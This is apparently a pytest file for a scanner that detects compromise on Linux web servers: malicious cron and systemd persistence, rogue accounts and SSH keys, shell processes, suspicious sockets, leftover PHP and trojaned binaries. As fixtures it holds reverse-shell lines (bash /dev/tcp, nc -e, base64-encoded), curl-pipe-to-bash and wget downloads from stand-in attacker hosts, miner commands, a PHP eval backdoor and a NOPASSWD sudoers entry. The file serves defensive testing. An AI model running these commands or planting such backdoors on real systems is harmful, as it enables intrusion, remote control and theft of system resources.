"""Persistence, accounts, processes, network, PHP remnants and integrity checks."""

import os
import time

import pytest

from php2shell_scanner.checks import (accounts, integrity, network, persistence, php_remnants,
                                   processes)
from php2shell_scanner.models import Discovery, Kind, ProcInfo, Severity
from php2shell_scanner.signatures import scan
from php2shell_scanner.signatures.system import COMMAND_SIGNATURES

from conftest import rules


# ------------------------------------------------------------------- persistence
@pytest.mark.parametrize("command, rule", [
    ("curl -fsSL http://203.0.113.5/x.sh | bash", "CMD-DOWNLOAD-EXEC"),
    ("wget -q http://evil.example/k -O /tmp/k; chmod +x /tmp/k", "CMD-DOWNLOAD-RUN"),
    ("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQo= | base64 -d | bash",
     "CMD-BASE64-EXEC"),
    ("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "CMD-DEV-TCP"),
    ("nc -e /bin/sh 203.0.113.5 4444", "CMD-NC-EXEC"),
    ("python3 -c 'import socket,pty;s=socket.socket()'", "CMD-SCRIPT-SOCKET"),
    ("./xmrig -o stratum+tcp://pool.example:3333", "CMD-MINER"),
    ("chattr +i /root/.ssh/authorized_keys", "CMD-LOCK-FILE"),
    ("cd /; nohup /dev/shm/.x/run &", "CMD-TMP-EXEC"),
    ("ExecStart\n/var/tmp/kinsing", "CMD-TMP-EXEC"),
])
def test_command_signatures(command, rule):
    assert rule in {m.signature.rule for m in scan(COMMAND_SIGNATURES, command)}


@pytest.mark.parametrize("command", [
    "0 3 * * * find /tmp/ -type f -mtime +7 -delete",
    "*/1 * * * * curl -sS --connect-timeout 10 'http://127.0.0.1:8888/hook'",
    '0 0 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null',
    "export http_proxy=http://10.0.0.1:3128/",
])
def test_benign_commands(command):
    assert scan(COMMAND_SIGNATURES, command) == []


@pytest.mark.parametrize("text, system, expected", [
    ("*/10 * * * * root /tmp/.ssh/update >/dev/null", True, ["/tmp/.ssh/update >/dev/null"]),
    ("0 3 * * * find /tmp/x -delete", False, ["find /tmp/x -delete"]),
    ("@reboot www-data /dev/shm/x\nSHELL=/bin/sh\n# c", True, ["/dev/shm/x"]),
])
def test_cron_command_extraction(text, system, expected):
    assert persistence.cron_commands(text, system) == expected


def test_cron_systemd_preload(tree, scan_env):
    tree.write("/var/spool/cron/crontabs/www-data", "* * * * * curl -s http://x.example/a|sh\n")
    tree.write("/etc/cron.d/sysupdate", "*/10 * * * * root /tmp/.ssh/update >/dev/null 2>&1\n")
    tree.write("/etc/systemd/system/dbus-update.service",
               "[Service]\nExecStart=/dev/shm/.dbus/dbus-daemon --session\n")
    tree.write("/lib/systemd/system/cron.service", "[Service]\nExecStart=/usr/sbin/cron -f\n")
    tree.write("/etc/ld.so.preload", "/usr/lib/libprocesshider.so\n")
    tree.write("/root/.bashrc", "alias ls='ls --color'\n(curl -s http://x.example/b | sh &)\n")
    tree.write("/etc/init.d/x11-common", "rm -rf /tmp/.X11-unix\n/tmp/whatever start\n")
    ctx, disc = scan_env()
    found = persistence.run(ctx, disc)
    got = rules(found)
    assert {"PERSIST-WEBUSER-CRON", "CMD-DOWNLOAD-EXEC", "PERSIST-CRON-TMP-BINARY",
            "PERSIST-UNIT-TMP-BINARY", "PERSIST-LD-PRELOAD"} <= got
    cron_tmp = [f for f in found if f.rule == "PERSIST-CRON-TMP-BINARY"]
    assert [f.path for f in cron_tmp] == ["/etc/cron.d/sysupdate"]
    assert not any(f.path == "/lib/systemd/system/cron.service" for f in found)
    assert not any(f.path == "/etc/init.d/x11-common" for f in found)  # MEDIUM only, pkg path


# ---------------------------------------------------------------------- accounts
def test_accounts(tree, scan_env):
    tree.write("/etc/passwd", open(tree.path("/etc/passwd")).read()
               .replace("www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
                        "www-data:x:33:33:www-data:/var/www:/bin/bash")
               + "toor:x:0:0::/root:/bin/bash\n")
    tree.write("/etc/group", "sudo:x:27:alice,www-data\n")
    tree.write("/etc/shadow", "www-data:$6$abc$def:19000:0:99999:7:::\nalice:!:19000::::::\n")
    tree.write("/etc/sudoers.d/90-web", "www-data ALL=(ALL) NOPASSWD: ALL\n")
    tree.write("/var/www/.ssh/authorized_keys", "ssh-ed25519 AAAAC3Nza attacker@kali\n")
    tree.write("/root/.ssh/authorized_keys", "ssh-rsa AAAAB3Nza admin@laptop\n")
    tree.write("/etc/ssh/sshd_config", "AuthorizedKeysFile .ssh/authorized_keys /var/tmp/.k\n")
    ctx, disc = scan_env()
    got = rules(accounts.run(ctx, disc))
    assert {"ACCT-UID0", "ACCT-WEBUSER-SHELL", "ACCT-WEBUSER-PASSWORD",
            "ACCT-WEBUSER-PRIV-GROUP", "ACCT-WEBUSER-SUDO", "ACCT-WEBUSER-SSH-KEY",
            "ACCT-SSH-KEYS", "ACCT-SSHD-KEYFILE"} <= got


def test_recent_root_keys_flagged_with_since(tree, scan_env):
    tree.write("/root/.ssh/authorized_keys", "ssh-rsa AAAAB3Nza x@y\n")
    ctx, disc = scan_env(since=time.time() - 60)
    assert "ACCT-SSH-KEYS-RECENT" in rules(accounts.run(ctx, disc))


# --------------------------------------------------------------------- processes
def disc_with(procs=(), web_uids=frozenset({33})) -> Discovery:
    from php2shell_scanner.models import UserInfo
    users = (UserInfo("root", 0, 0, "/root", "/bin/bash"),
             UserInfo("www-data", 33, 33, "/var/www", "/usr/sbin/nologin"))
    return Discovery(users, {}, ("www-data",), web_uids, frozenset(), (), (), (), (),
                     tuple(procs), ())


def proc(pid=100, uid=33, name="bash", cmd="bash", exe="/usr/bin/bash", cwd="/", inodes=()):
    return ProcInfo(pid, 1, uid, name, cmd, exe, "", cwd, frozenset(inodes))


@pytest.mark.parametrize("p, rule", [
    (proc(cmd="sh -c id"), "PROC-WEBUSER-SHELL"),
    (proc(name="python3", cmd="python3 -c import pty", exe="/usr/bin/python3.11"),
     "PROC-WEBUSER-INLINE-CODE"),
    (proc(uid=0, name="kworker", cmd="[kworker/0:2]", exe="/tmp/.k"), "PROC-FAKE-KTHREAD"),
    (proc(uid=0, name="x", cmd="x", exe="/dev/shm/x"), "PROC-TMP-EXE"),
    (proc(uid=0, name="x", cmd="x", exe="/root/x (deleted)"), "PROC-DELETED-EXE"),
    (proc(uid=1000, name="xmrig", cmd="xmrig -o stratum+tcp://p:3333", exe="/home/a/xmrig"),
     "PROC-MINER"),
    (proc(name="php", cmd="php /tmp/x.php", exe="/usr/bin/php8.2"), "PROC-WEBUSER-TMP-SCRIPT"),
])
def test_process_rules(p, rule):
    assert rule in rules(processes.check_process(p, disc_with()))


@pytest.mark.parametrize("p", [
    proc(name="nginx", cmd="nginx: worker process", exe="/usr/sbin/nginx"),
    proc(name="php-fpm8.2", cmd="php-fpm: pool www", exe="/usr/sbin/php-fpm8.2"),
    proc(name="python3", cmd="/usr/bin/python3 /usr/local/bin/gunicorn app:app",
         exe="/usr/bin/python3.11"),
    proc(uid=0, name="kworker/0:1", cmd="", exe=""),
    proc(uid=0, name="sshd", cmd="/usr/sbin/sshd -D", exe="/usr/sbin/sshd"),
])
def test_benign_processes(p):
    assert processes.check_process(p, disc_with()) == []


# ----------------------------------------------------------------------- network
PROC_NET_TCP = """  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:2328 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 1111 1
   1: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2222 1
   2: 0A00000A:A1B2 0900710C:115C 01 00000000:00000000 00:00000000 00000000    33        0 3333 1
"""


def test_proc_net_parsing_and_rules():
    socks = network.parse_proc_net(PROC_NET_TCP)
    assert socks[0].local_ip == "0.0.0.0" and socks[0].local_port == 9000
    assert socks[1].local_ip == "127.0.0.1" and socks[1].local_port == 8080
    assert socks[2].remote_ip == "12.113.0.9" and socks[2].remote_port == 4444
    shell = proc(inodes=(3333,))
    fpm = proc(pid=200, uid=0, name="php-fpm8.2", cmd="php-fpm: master", exe="/usr/sbin/php-fpm8.2")
    bind = proc(pid=300, name="perl", cmd="perl x.pl", exe="/usr/bin/perl")
    disc = disc_with()
    assert "NET-SHELL-CONNECTION" in rules(network.check_socket(socks[2], shell, disc))
    assert "NET-FPM-EXPOSED" in rules(network.check_socket(socks[0], fpm, disc))
    assert "NET-WEBUSER-LISTENER" in rules(network.check_socket(socks[0], bind, disc))
    assert network.check_socket(socks[1], fpm, disc) == []


# --------------------------------------------------------------------------- php
@pytest.mark.parametrize("version, expected", [
    ("5.3.29", False), ("5.4.0", True), ("7.4.33", True), ("8.1.31", True),
    ("8.2.34", True), ("8.2.35", False), ("8.3.35", True), ("8.3.36", False),
    ("8.4.26", True), ("8.4.27", False), ("8.5.11", True), ("8.5.12", False),
    ("8.6.0", False), ("unknown", None),
])
def test_version_matrix(version, expected):
    assert php_remnants.version_vulnerable(version) is expected


def test_php_binary_version_from_strings_without_executing(tree, scan_env):
    tree.write("/usr/sbin/php-fpm8.2", b"\x7fELF" + b"\x00" * 100
               + b"X-Powered-By: PHP/8.2.34\x00" + b"\x00" * 100, mode=0o755)
    tree.symlink("/usr/sbin/php-fpm8.2", "/usr/sbin/php-fpm")
    ctx, disc = scan_env()
    found = php_remnants.check_builds(ctx, disc)
    assert len(found) == 1
    assert found[0].severity == Severity.HIGH and "8.2.34" in found[0].title


def test_dpkg_status_and_ini(tree, scan_env):
    tree.write("/var/lib/dpkg/status",
               "Package: php8.2-fpm\nStatus: deinstall ok config-files\nVersion: 8.2.7-1\n\n"
               "Package: phpmyadmin\nStatus: install ok installed\nVersion: 4:5.2.1\n\n"
               "Package: bash\nStatus: install ok installed\nVersion: 5.2\n")
    tree.write("/etc/php/8.2/fpm/php.ini", "auto_prepend_file = /var/tmp/.p.php\n"
                                          "allow_url_include = On\n")
    tree.write("/var/tmp/.p.php", "<?php @eval($_POST['k']);")
    tree.write("/etc/php/8.2/fpm/pool.d/www.conf", "[www]\nuser = www-data\nlisten = 9000\n")
    ctx, disc = scan_env()
    found = php_remnants.run(ctx, disc)
    by_rule = {f.rule: f for f in found}
    assert by_rule["PHP-INI-PREPEND"].severity == Severity.CRITICAL
    assert "PHP-INI-URL-INCLUDE" in by_rule and "PHP-ABSENT" in by_rule
    assert "php8.2-fpm" in by_rule["PHP-PACKAGE-LEFTOVERS"].evidence
    assert "phpmyadmin" in by_rule["PHP-PACKAGES"].evidence
    assert by_rule["PHP-FPM-PUBLIC-LISTEN"].severity == Severity.LOW  # PHP itself is gone


# --------------------------------------------------------------------- integrity
def test_integrity_output_parsing():
    out = ("??5??????   /usr/bin/ps\n??5?????? c /etc/ssh/sshd_config\n"
           "S.5....T.    /usr/share/doc/x\n.M.......    /usr/bin/ls\n")
    found = integrity.parse_verify(out, "procps")
    assert [(f.path, f.severity) for f in found] == [("/usr/bin/ps", Severity.CRITICAL)]
    assert all(f.kind == Kind.COMPROMISE for f in found)
    # minimised images: diverted or stripped files are not trojans
    assert integrity.parse_verify(out, "procps", frozenset({"/usr/bin/ps"})) == []
    assert integrity.parse_verify(out, "procps", exists=lambda path: False) == []


def test_live_only_checks_skip_offline(tree, scan_env):
    ctx, disc = scan_env()
    assert not ctx.live
    assert processes.run(ctx, disc) == [] and network.run(ctx, disc) == []
    assert integrity.run(ctx, disc) == []
    assert os.path.isdir(tree.root)


def test_apk_and_pacman_package_databases(tree, scan_env):
    tree.write("/lib/apk/db/installed", "P:musl\nV:1.2.5-r0\n\nP:php82-fpm\nV:8.2.34-r0\n\n")
    tree.write("/var/lib/pacman/local/php-8.3.20-1/desc", "%NAME%\nphp\n\n%VERSION%\n8.3.20-1\n")
    ctx, disc = scan_env()
    assert php_remnants.apk_packages(ctx) == [("php82-fpm", "8.2.34-r0", "installed")]
    assert php_remnants.pacman_packages(ctx) == [("php", "8.3.20-1", "installed")]



def test_generated_run_units_are_not_recent_persistence(tree, scan_env):
    import time as _time
    tree.write("/run/systemd/system/netplan-ovs-cleanup.service",
               "[Service]\nExecStart=/usr/sbin/netplan apply --only-ovs-cleanup\n")
    ctx, disc = scan_env(since=_time.time() - 60)
    assert "PERSIST-UNIT-RECENT" not in rules(persistence.run(ctx, disc))
